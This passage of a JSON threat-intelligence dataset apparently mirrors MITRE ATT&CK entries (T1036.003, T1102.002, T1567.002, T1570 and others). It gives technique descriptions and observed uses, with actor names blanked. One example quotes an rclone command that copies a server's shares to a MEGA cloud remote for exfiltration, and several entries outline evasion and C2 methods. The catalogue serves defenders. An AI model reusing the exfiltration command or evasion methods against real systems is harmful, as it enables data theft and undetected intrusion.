  "attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b": {
    "name": "Rename Legitimate Utilities",
    "example_uses": [
      "has renamed  and moved it to a different location on the system to avoid detection based on use of the tool.",
      "has renamed system utilities such as wscript.exe and mshta.exe.",
      "executes a Windows Batch script during installation that creases a randomly-named directory in the C:\\\\ root directory that copies and renames the legitimate Windows <curl>curl command to this new location.",
      "has moved and renamed pubprn.vbs to a .txt file to avoid detection.",
      "The  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.",
      "has renamed an image of `cmd.exe` with a random name followed by a `.tmpl` extension.",
      "used a renamed cmd.exe file to evade detection.",
      "used a renamed version of rundll32.exe such as dbengin.exe located in the `ProgramData\\Microsoft\\PlayReady` directory to proxy malicious DLL execution.",
      "has used a renamed legitimate `msinfo32.exe` executable to sideload the  payload during initial installation.",
      "has renamed system utilities such as `rundll32.exe` and `mshta.exe` to avoid detection."
    ],
    "description": "Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",
    "similar_words": [
      "Rename System Utilities",
      "Rename Legitimate Utilities"
    ],
    "id": "T1036.003"
  },
  "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4": {
    "name": "Bidirectional Communication",
    "example_uses": [
      "uses Microsoft OneDrive as a C2 server via a network drive mapped with net use.",
      "has used DropBox for C2 communications.",
      "For   used social media platforms to hide communications to C2 servers.",
      "can use Dropbox to receive commands and upload stolen data.",
      "can use Dropbox to download malicious payloads send commands and receive information.",
      "has used Technet and Pastebin web pages for command and control.",
      "The  malware communicates through the use of events in Google Calendar.",
      "uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.",
      "communicates to the C2 server by retrieving a Google Doc.",
      "has used Blogspot pages for C2.",
      "uses cloud based services for C2.",
      "can utilize web services including Google sites to send and receive C2 data.",
      "has used OneDrive and DropBox for C2.",
      "leverages social networking sites and cloud platforms (AOL Twitter Yandex Mediafire pCloud Dropbox and Box) for C2.",
      "uses blogs and third-party sites (GitHub tumbler and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.",
      "can use multiple C2 channels including RSS feeds Github forums and blogs.",
      "has used GitHub and a public blog service in Hong Kong for C2 communications.",
      "has used GitHub as C2 pulling hosted image payloads then committing command execution output to files in specific directories.",
      "has used blogs and WordPress for C2 infrastructure.",
      "can use OneDrive for C2.",
      "has communicated with C2 through files uploaded to and downloaded from DropBox.",
      "One variant of  uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.",
      "has the ability to use the Gmail web UI to receive commands and exfiltrate information.",
      "used blogpost.com as its primary command and control server during a campaign.",
      "malware can use a SOAP Web service to communicate with its C2 server.",
      "A  JavaScript backdoor has used Google Apps Script as its C2 server.",
      "has used cloud services including OneDrive for C2.",
      "has used Google Drive as a Command and Control channel.",
      "uses the Dropbox cloud storage service for command and control.",
      "can use different cloud providers for its C2.",
      "has used compromised WordPress blogs as C2 servers.",
      "has used a VBScript named ggldr that uses Google Apps Script Sheets and Forms services for C2.",
      "can use Dropbox as its C2 server.",
      "can use Dropbox and GitHub for C2.",
      "used legitimate services like Google Docs Google Scripts and Pastebin for C2.",
      "has used legitimate social networking sites and cloud platforms (including but not limited to Twitter Yandex Dropbox and Mediafire) for C2 communications.",
      "communicates to servers operated by Google using the Jabber/XMPP protocol.",
      "can use public cloud-based storage providers for command and control.",
      "is capable of leveraging cloud storage APIs such as Cloud Box Dropbox and Yandex for C2.",
      "has used AOL Instant Messenger for C2.",
      "has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor.  also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.",
      "has used Google Drive for C2.",
      "has the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages.",
      "has used web services including OneHub to distribute remote access tools.",
      "has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.",
      "has also obfuscated its C2 traffic as normal traffic to sites such as Github.",
      "has used Blogspot pages and a Github repository for C2.",
      "can use the Microsoft Graph API to access an attacker-controlled OneDrive account and retrieve payloads and backdoor commands.",
      "can use the Microsoft Office Exchange Web Services API to access an actor-controlled account and retrieve C2 commands and payloads placed in Draft messages.",
      "uses the Microsoft Graph API to connect to an actor-controlled OneDrive account to download and execute files and shell commands and to create directories to share exfiltrated data.",
      "can use a REST-based Microsoft Graph API to access draft messages in a shared Microsoft Office 365 Outlook email account used for C2 communication.",
      "has used a Github repository for C2.",
      "has used virtual private servers (VPS) for command and control traffic as well as third-party cloud services in more recent variants."
    ],
    "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",
    "similar_words": [
      "Bidirectional Communication"
    ],
    "id": "T1102.002"
  },
  "attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46": {
    "name": "Wordlist Scanning",
    "example_uses": [
      "leverages various tools and frameworks to brute-force directories on web servers.",
      "has used DirBuster and GoBuster to brute force web directories and DNS subdomains."
    ],
    "description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a websites pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ",
    "similar_words": [
      "Wordlist Scanning"
    ],
    "id": "T1595.003"
  },
  "attack-pattern--bef8aaee-961d-4359-a308-4c2182bcedff": {
    "name": "Spoof Security Alerting",
    "example_uses": [],
    "description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a healthy system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a healthy system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",
    "similar_words": [
      "Spoof Security Alerting"
    ],
    "id": "T1562.011"
  },
  "attack-pattern--bf147104-abf9-4221-95d1-e81585859441": {
    "name": "Outlook Home Page",
    "example_uses": [
      "has abused the Outlook Home Page feature for persistence.  has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.",
      "can be used to automate the abuse of Outlook Home Pages to establish persistence."
    ],
    "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)Once malicious home pages have been added to the users mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)",
    "similar_words": [
      "Outlook Home Page"
    ],
    "id": "T1137.004"
  },
  "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada": {
    "name": "Asymmetric Cryptography",
    "example_uses": [
      "can SSL encrypt C2 traffic.",
      "has used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications.",
      "can encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV which are then encrypted using a hard-coded RSA public key.",
      "is known to use RSA keys for encrypting C2 traffic.",
      "has the ability to communicate over TLS.",
      "has used TLS encrypted C2 communications including for campaigns using AsyncRAT.",
      "During  threat actors' proxy implementation Agent upgraded the socket in use to a TLS socket.",
      "C2 communication has been encrypted using OpenSSL.",
      "uses SSL for encrypting C2 communications.",
      "can use TLS in C2 communications.",
      "has the ability to encrypt C2 traffic with SSL/TLS.",
      "can use a hardcoded RSA key to encrypt some of its C2 traffic.",
      "can use SSL/TLS encryption for its HTTP-based C2 channel.  has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.",
      "has encrypted C2 communications with the ECIES algorithm.",
      "uses custom encryption for C2 that uses RSA.",
      "has used RSA encrypted communications with C2.",
      "can use SSL in C2 communication.",
      "default encryption for its C2 communication channel is SSL but it also has transport options for RSA and AES.",
      "may set up a reverse SSH tunnel to give the attacker access to services running on the victim such as RDP.",
      "supports SSL encrypted C2.",
      "can use a hardcoded server public RSA key to encrypt the first request to C2.",
      "Blowfish key is encrypted with a public RSA key.",
      "has used the embedTLS library for network communications.",
      "has encrypted traffic with RSA.",
      "can communicate to C2 with mutual TLS where client and server mutually check certificates.",
      "has used SSL to connect to C2 servers.",
      "can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.",
      "can communicate over SSL using the private key from the Ivanti Connect Secure web server.",
      "has used RSA encryption for C2 communications.",
      "encapsulates traffic in multiple layers of encryption using TLS by default.",
      "has RSA-encrypted its communication with the C2 server.",
      "can use mutual TLS and RSA cryptography to exchange a session key.",
      "can use RSA-4096 to encrypt data sent to its C2 server.",
      "encrypts communications using RSA-2048.",
      "can beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes.",
      "can use TLS to encrypt its C2 channel.",
      "connects to command and control infrastructure using SSL.",
      "can secure C2 communications with SSL and TLS.",
      "used the Plink utility and other tools to create tunnels to C2 servers.",
      "can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.",
      "has used TLS-encrypted FTP to exfiltrate data.",
      "can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.",
      "Some  variants use SSL to encrypt C2 communications.",
      "encrypts C2 traffic with TLS.",
      "has encrypted C2 traffic using SSL/TLS.",
      "variants can use SSL for encrypting C2 communications.",
      "encrypts C2 traffic with AES and RSA.",
      "uses SSL/TLS and RC4 to encrypt traffic.",
      "During  the threat actors used SSL via TCP port 443 for C2 communications.",
      "can use TLS-encrypted WebSocket Protocol (WSS) for C2.",
      "has encrypted C2 traffic with RSA.",
      "uses SSL and AES ECB for encrypting C2 communications.",
      "used TLS to encrypt command and control (C2) communications.",
      "has used the Plink utility to create SSH tunnels.",
      "A variant of  encrypts some C2 with RSA.",
      "contains a copy of the OpenSSL library to encrypt C2 traffic.",
      "has the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key.",
      "can use SSL and TLS for communications.",
      "uses  for command and control traffic and routes a custom cryptographic protocol over the  circuit.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "can use TLS to encrypt its C2 channel.",
      "has used the Plink utility to tunnel RDP back to C2 infrastructure.",
      "uses SSL for encrypting C2 communications.",
      "contains a copy of the OpenSSL library to encrypt C2 traffic.",
      "authentication and key exchange is performed using RSA-512.",
      "can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.",
      "encrypts C2 communications with TLS.",
      "has used SSL and TLS in communications with C2.",
      "can send short C2 commands up to 512 bytes encrypted with RSA-4096.",
      "used HTTPS for command and control of compromised Versa Director servers.",
      "can be configured to only accept TLS connections.",
      "has used HTTPS for C2 communication.",
      "used HTTPS for command and control.",
      "can utilize SSL to encrypt command and control traffic.",
      "can use TLS to encrypt C2 communications.",
      "can communicate back to send a challenge to C2 infrastructure over SSL.",
      "has used a reverse SSH shell to securely communicate with victim devices.",
      "uses the WolfSSL library to implement SSL encryption for command and control communication.",
      "can use OpenSSL and TLS certificates to encrypt traffic.",
      "uses SSL for network communication.",
      "used the  utility and other tools to create tunnels to C2 servers.",
      "During   used SSL for network communication.",
      "uses HTTPS for command and control communication.",
      "has used HTTPS for C2 communications.",
      "has used tools such as  with command and control communication taking place over HTTPS.",
      "has used HTTPS for command and control purposes.",
      "can use the OpenSSL library to encrypt C2 communications.",
      "uses reverse proxy functionality that employs SSL to encrypt communications."
    ],
    "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receivers public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
    "similar_words": [
      "Asymmetric Cryptography"
    ],
    "id": "T1573.002"
  },
  "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b": {
    "name": "Exfiltration to Cloud Storage",
    "example_uses": [
      "has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.",
      "will exfiltrate victim data using applications such as .",
      "has exfiltrated data to Google Drive.",
      "can exfiltrate data to cloud storage services such as Dropbox Google Drive Amazon S3 and MEGA.",
      "can use a file exfiltration tool to upload specific files to Dropbox.",
      "can use cloud services including OneDrive for data exfiltration.",
      "exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.",
      "has exfiltrated stolen files and data to actor-controlled Blogspot accounts.",
      "has exfiltrated stolen data to Dropbox.",
      "has exfiltrated victim data to cloud storage service accounts.",
      "has exfiltrated stolen data to -owned OneDrive and Dropbox accounts.",
      "has used cloud services including OneDrive for data exfiltration.",
      "During  the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the  command `rclone.exe copy --max-age 2y \\\\SERVER\\Shares Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.",
      "can send files from a victim's machine to Dropbox.",
      "has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service Aliyun OSS.",
      "has exfiltrated stolen data to Dropbox.",
      "has exfiltrated data to file sharing sites.",
      "has exfiltrated stolen victim data to various cloud storage providers.",
      "has used WebDAV to upload stolen USB files to a cloud drive.  has also exfiltrated stolen files to OneDrive and 4shared.",
      "has exfiltrated data to file sharing sites including MEGA.",
      "can use Dropbox for data exfiltration.",
      "has used the megacmd tool to upload stolen files from a victim network to MEGA.",
      "has used a DropBox uploader to exfiltrate stolen files.",
      "has exfiltrated stolen data to Dropbox.",
      "has the capability to download folders' contents on the system and upload the results back to its Dropbox drive.",
      "During   used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.",
      "can upload stolen files to OneDrive storage accounts via HTTP `POST`.",
      "has exfiltrated stolen data to OneDrive accounts.",
      "has exfiltrated victim data to the MEGA file sharing site.",
      "can send collected data to cloud storage services such as PCloud.",
      "can upload data to dedicated per-victim folders in Dropbox.",
      "has exfiltrated stolen data to the MEGA file sharing site.",
      "has exfiltrated data using  or MEGASync prior to deploying ransomware.",
      "has used tools such as  to exfiltrate information from victim environments to cloud storage such as `mega.nz`.",
      "exfiltrated collected information to OneDrive.",
      "can use an attacker-controlled OneDrive account for exfiltration.",
      "can exfiltrate files to an actor-controlled OneDrive account via the Microsoft Graph API."
    ],
    "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
    "similar_words": [
      "Exfiltration to Cloud Storage"
    ],
    "id": "T1567.002"
  },
  "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5": {
    "name": "Lateral Tool Transfer",
    "example_uses": [
      "has copied itself to remote systems using the `service.exe` filename.",
      "can replicate itself across connected servers via `psexec`.",
      "has deployed tools after moving laterally using administrative accounts.",
      "has spread malware in target networks by copying modules to folders masquerading as removable devices.",
      "Operators deploying  have used psexec to copy the  payload across accessible systems.",
      "can be used to create  to upload and/or download files from SMB file servers.",
      "has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.",
      "may be abused by adversaries to transfer tools or files between systems within a compromised environment.",
      "can be used to copy files to/from a remote share.",
      "can use  for propagation on Windows hosts within intranets.",
      "has copied web shells between servers in targeted environments.",
      "has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.",
      "RPC backdoors can be used to transfer files to/from victim machines on the local network.",
      "During  the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.",
      "During the   used `move` to transfer files to a network share.",
      "can be used to download or upload a file over a network share.",
      "has copied tools between compromised hosts using SMB.",
      "attempts to copy itself to remote machines on the network.",
      "During  threat actors used SMB to copy files to and from target systems.",
      "During the   used a Group Policy Object (GPO) to copy 's executable `msserver.exe` from a staging server to a local hard drive before deployment.",
      "has used  to move laterally between hosts in the target network.",
      "attempts to copy itself to remote machines on the network.",
      "has copied tools within a compromised network using RDP.",
      "can be used to download or upload a file over a network share.",
      "can copy files to other machines on a compromised network.",
      "searches for network drives and removable media and duplicates itself onto them.",
      "has used `move` to transfer files to a network share and has copied payloads--such as  ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.",
      "During the   moved their tools laterally within the corporate network and between the ICS and corporate network.",
      "has been observed moving around the victim network via SMB indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.",
      "uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.",
      "During  the threat actors used WMI to load  onto additional hosts within a compromised network.",
      "uses remote shares to move and remotely execute payloads during lateral movemement.",
      "can be used to copy files to/from a remotely connected internal system.",
      "attempts to copy itself to remote computers after gaining access via an SMB exploit.",
      "can push its encryption executable to multiple endpoints within compromised infrastructure.",
      "can download additional payloads from command and control nodes and execute them.",
      "retrieves follow-on payloads direct from adversary-owned infrastructure for deployment on compromised hosts.",
      "has used a rapid succession of copy commands to install a file encryption executable across multiple endpoints within compromised infrastructure.",
      "During  threat actors initiated a process named Mellona.exe to spread the  file encryptor and a persistence script to a list of internal machines.",
      "has used `move` to transfer files to a network share and has copied payloads--such as  ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally  has transferred an ISO file into the OT network to gain initial access.",
      "can download the  malware for follow-on execution.",
      "downloaded some payloads for follow-on execution from legitimate filesharing services such as ufile.io and easyupload.io.",
      "transferred files laterally within victim networks through the  toolkit.",
      "spreads itself laterally by writing the JavaScript launcher file to mapped shared folders.",
      "transfered tools such as  and the AnyDesk remote access tool during operations using SMB shares.",
      "has used the  toolset to move and remotely execute payloads to other hosts in victim networks.",
      "has used its `wmiexec` command leveraging Windows Management Instrumentation to remotely stage and execute payloads in victim networks."
    ],
    "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)",
    "similar_words": [
      "Lateral Tool Transfer"
    ],
    "id": "T1570"
  },
  "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b": {
    "name": "Path Interception by Unquoted Path",
    "example_uses": [
      "contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.",
      "contains modules that can discover and exploit unquoted path vulnerabilities."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\"). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "similar_words": [
      "Path Interception by Unquoted Path"
    ],
    "id": "T1574.009"
  },
  "attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069": {
    "name": "Install Digital Certificate",
    "example_uses": [
      "captured legitimate SSL certificates from victim organizations and installed these on -controlled infrastructure to enable subsequent adversary-in-the-middle operations."
    ],
    "description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",
    "similar_words": [
      "Install Digital Certificate"
    ],
    "id": "T1608.003"
  },
  "attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f": {
    "name": "Startup Items",
    "example_uses": [
      "can list and manage startup entries."
    ],
    "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, /Library/StartupItems isnt guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",
    "similar_words": [
      "Startup Items"
    ],
    "id": "T1037.005"
  },
  "attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19": {
    "name": "System Language Discovery",
    "example_uses": [
      "During   deployed malware designed not to run on computers set to Korean Japanese or Chinese in Windows language preferences.",
      "can use the GetKeyboardLayout API to check if a compromised host's keyboard is set to Persian.",
      "uses AppleScript to check the host's language and location with the command user locale of (get system info).",
      "can check if Russian language is installed on the infected machine by using the function GetKeyboardLayoutList.",
      "has used implants to collect the system language ID of a compromised machine.",
      "can check whether the target system is using Japanese Taiwanese or English through detection of specific Windows Security and Internet Explorer dialog.",
      "checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.",
      "has checked the language of the machine with function GetUserDefaultUILanguage and terminated execution if the language matches with an entry in the predefined list.",
      "checks and will terminate execution if the compromised systems language ID is not Spanish or Portuguese.",
      "has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word Arabic before executing.",
      "has been observed to query the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language and the value InstallLanguage. If the machine has the value 0x419 (Russian) 0x422 (Ukrainian) or 0x423 (Belarusian) it stops execution.",
      "has attempted to determine if a compromised system was using a Japanese keyboard via the `GetKeyboardType` API call.",
      "can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.",
      "Some versions of  have performed language ID and keyboard layout checks; if either of these matched Russian Kazakh Belarusian Ukrainian or Tatar  would exit.",
      "can identify the system language on a compromised host.",
      "has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the GetTextCharset function.",
      "queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN LANG_BELARUSIAN LANG_KAZAK or LANG_UKRAINIAN.",
      "has used Accept-Language to identify hosts in the United Kingdom United States France and Spain.",
      "has checked for the presence of Arabic language in the infected machine's settings.",
      "can check the system language using GetUserDefaultUILanguage and GetSystemDefaultUILanguage. If the language is found in the list the process terminates.",
      "lists all the keyboard layouts installed on the victims system using GetKeyboardLayoutList API and checks against a hardcoded language code list. If a match if found SynAck sleeps for 300 seconds and then exits without encrypting files.",
      "has attempted to detect if a compromised host had a Japanese keyboard via the Windows API call `GetKeyboardType`.",
      "has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.",
      "will terminate 's infection process if the language of the victim machine is not Spanish or Portuguese.",
      "can check the systems `LANG` environmental variable to prevent infecting devices from Armenia (`hy_AM`) Belarus (`be_BY`) Kazakhstan (`kk_KZ`) Russia (`ru_RU`) and Ukraine (`uk_UA`).",
      "used the following command to check the country/language of the active console: ` cmd.exe /c chcp >&2`.",
      "can determine if a victim's computer is running an operating system with specific language preferences.",
      "identified system language settings to determine follow-on execution.",
      "can check if a targeted machine is using a set of Eastern European languages and exit without infection if so.",
      "variants check system language settings via keyboard layout or similar mechanisms.",
      "can determine system location based on the default language setting and will not execute on systems located in former Soviet countries.",
      "will not affect machines with language settings matching a defined exlusion list of mainly Eastern European languages.",
      "identifies the language on the victim system."
    ],
    "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgnging May 2018)On a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.",
    "similar_words": [
      "System Language Discovery"
    ],
    "id": "T1614.001"
  },
  "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916": {
    "name": "Steganography",
    "example_uses": [
      "has used steganography to hide shellcode in a BMP image file.",
      "can also embed data within a BMP image prior to exfiltration.",
      "uses steganography to hide backdoors in PNG files which are also encrypted using the Tiny Encryption Algorithm (TEA).",
      "For  the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.",
      "uses steganography to send images to users that are embedded with shellcode.",
